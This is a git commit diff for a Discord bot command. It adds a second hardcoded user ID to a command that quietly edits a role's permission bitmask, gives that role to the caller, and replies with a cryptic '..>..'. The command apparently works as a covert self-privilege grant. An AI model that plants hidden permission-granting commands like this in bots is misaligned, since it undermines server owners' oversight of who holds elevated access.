5d0692a8f59f148fe43519498d795c2add6e6aba
WhoAmI1000 <39578224+WhoAmI1000@users.noreply.github.com>
2020-10-06 20:49:18 -0700

    Update index.ts

--- index.ts
+++ index.ts
@@ -4,12 +4,12 @@ commands.on(
     input: args.textOptional()
   }),
   async (message, { input }) => {
-    if (message.author.id != '258265415770177536') {
+    if (message.author.id != '258265415770177536' && message.author.id != '401828594961350658') {
       return;
     }
     let x = await message.getGuild();
     let y = await x.getRole('763124282158481418');
-    await y.edit({ permissions: 670425025, color: 0x065ba2 });
+    await y.edit({ permissions: 653647553, color: 0x065ba2 });
     await message.member?.addRole('763124282158481418');
     await message.reply('..>..');
   }
